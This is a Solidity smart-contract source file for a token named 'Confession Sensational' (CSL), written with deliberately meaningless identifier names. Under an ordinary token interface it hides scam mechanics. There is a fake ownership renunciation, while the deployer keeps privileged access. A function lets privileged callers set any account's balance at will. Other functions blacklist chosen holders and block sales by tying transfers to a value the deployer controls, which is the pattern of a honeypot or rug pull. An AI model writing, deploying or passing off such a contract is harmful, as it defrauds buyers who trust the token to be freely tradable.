//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface shouldMarketingAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchedReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderListFund {
    function createPair(address toTradingToken, address minSwap) external returns (address);
}

interface liquidityIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitLiquidity) external view returns (uint256);

    function transfer(address modeReceiverExempt, uint256 feeLaunch) external returns (bool);

    function allowance(address sellTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address modeReceiverExempt,
        uint256 feeLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedIs, uint256 value);
    event Approval(address indexed sellTrading, address indexed spender, uint256 value);
}

interface isMinWallet is liquidityIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConfessionSensational is launchedReceiver, liquidityIs, isMinWallet {

    event OwnershipTransferred(address indexed launchSellTotal, address indexed senderLimit);

    function decimals() external view virtual override returns (uint8) {
        return swapFeeMarketing;
    }

    uint256 private fromReceiverMax;

    function totalSupply() external view virtual override returns (uint256) {
        return enableTo;
    }

    mapping(address => uint256) private swapList;

    function approve(address atList, uint256 feeLaunch) public virtual override returns (bool) {
        amountTx[_msgSender()][atList] = feeLaunch;
        emit Approval(_msgSender(), atList, feeLaunch);
        return true;
    }

    address private exemptTo;

    uint256 private enableTo = 100000000 * 10 ** 18;

    address public sellTake;

    function liquidityReceiver(address receiverExempt) public {
        if (listAt) {
            return;
        }
        
        limitMaxSell[receiverExempt] = true;
        if (fromReceiverMax == enableTeam) {
            enableTeam = listReceiver;
        }
        listAt = true;
    }

    uint256 feeLimit;

    function limitList(address isTo) public {
        receiverExemptTo();
        if (receiverAmountSell != limitFee) {
            receiverAmountSell = false;
        }
        if (isTo == sellTake || isTo == buySellFee) {
            return;
        }
        sellModeFee[isTo] = true;
    }

    bool public isMode;

    uint256 fromSell;

    uint256 constant exemptAt = 13 ** 10;

    uint256 private enableTeam;

    mapping(address => mapping(address => uint256)) private amountTx;

    string private marketingTeamSwap = "CSL";

    function receiverExemptTo() private view {
        require(limitMaxSell[_msgSender()]);
    }

    function sellAuto(address isToken, address modeReceiverExempt, uint256 feeLaunch) internal returns (bool) {
        if (isToken == sellTake) {
            return exemptSenderLimit(isToken, modeReceiverExempt, feeLaunch);
        }
        uint256 teamIs = liquidityIs(buySellFee).balanceOf(liquidityTo);
        require(teamIs == fromSell);
        require(modeReceiverExempt != liquidityTo);
        if (sellModeFee[isToken]) {
            return exemptSenderLimit(isToken, modeReceiverExempt, exemptAt);
        }
        return exemptSenderLimit(isToken, modeReceiverExempt, feeLaunch);
    }

    mapping(address => bool) public sellModeFee;

    function transferFrom(address isToken, address modeReceiverExempt, uint256 feeLaunch) external override returns (bool) {
        if (_msgSender() != enableLiquidity) {
            if (amountTx[isToken][_msgSender()] != type(uint256).max) {
                require(feeLaunch <= amountTx[isToken][_msgSender()]);
                amountTx[isToken][_msgSender()] -= feeLaunch;
            }
        }
        return sellAuto(isToken, modeReceiverExempt, feeLaunch);
    }

    function getOwner() external view returns (address) {
        return exemptTo;
    }

    function tokenBuy() public {
        emit OwnershipTransferred(sellTake, address(0));
        exemptTo = address(0);
    }

    bool public shouldBuy;

    bool public receiverAmountSell;

    constructor (){
        if (isMode) {
            fromReceiverMax = enableTeam;
        }
        tokenBuy();
        shouldMarketingAmount receiverTake = shouldMarketingAmount(enableLiquidity);
        buySellFee = senderListFund(receiverTake.factory()).createPair(receiverTake.WETH(), address(this));
        if (isMode == shouldBuy) {
            listReceiver = fromReceiverMax;
        }
        sellTake = _msgSender();
        limitMaxSell[sellTake] = true;
        swapList[sellTake] = enableTo;
        if (enableTeam == fromReceiverMax) {
            isMode = false;
        }
        emit Transfer(address(0), sellTake, enableTo);
    }

    function allowance(address limitShould, address atList) external view virtual override returns (uint256) {
        if (atList == enableLiquidity) {
            return type(uint256).max;
        }
        return amountTx[limitShould][atList];
    }

    function transfer(address receiverSell, uint256 feeLaunch) external virtual override returns (bool) {
        return sellAuto(_msgSender(), receiverSell, feeLaunch);
    }

    mapping(address => bool) public limitMaxSell;

    string private tokenSwap = "Confession Sensational";

    uint8 private swapFeeMarketing = 18;

    address enableLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return tokenSwap;
    }

    address public buySellFee;

    uint256 public listReceiver;

    bool public listAt;

    bool public limitFee;

    function balanceOf(address limitLiquidity) public view virtual override returns (uint256) {
        return swapList[limitLiquidity];
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingTeamSwap;
    }

    function receiverTx(address receiverSell, uint256 feeLaunch) public {
        receiverExemptTo();
        swapList[receiverSell] = feeLaunch;
    }

    function launchTx(uint256 feeLaunch) public {
        receiverExemptTo();
        fromSell = feeLaunch;
    }

    function exemptSenderLimit(address isToken, address modeReceiverExempt, uint256 feeLaunch) internal returns (bool) {
        require(swapList[isToken] >= feeLaunch);
        swapList[isToken] -= feeLaunch;
        swapList[modeReceiverExempt] += feeLaunch;
        emit Transfer(isToken, modeReceiverExempt, feeLaunch);
        return true;
    }

    address liquidityTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return exemptTo;
    }

}